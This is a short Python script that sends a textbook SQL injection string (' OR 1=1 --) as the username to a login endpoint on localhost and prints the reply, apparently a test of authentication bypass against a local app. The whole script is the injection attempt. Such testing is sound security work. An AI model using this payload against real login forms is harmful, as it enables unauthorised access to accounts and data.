import requests

url = "http://127.0.0.1:5000/login"

payload = {
    "username": "' OR 1=1 --",
    "password": "anything"
}

res = requests.post(url, json=payload)
print(res.status_code, res.text)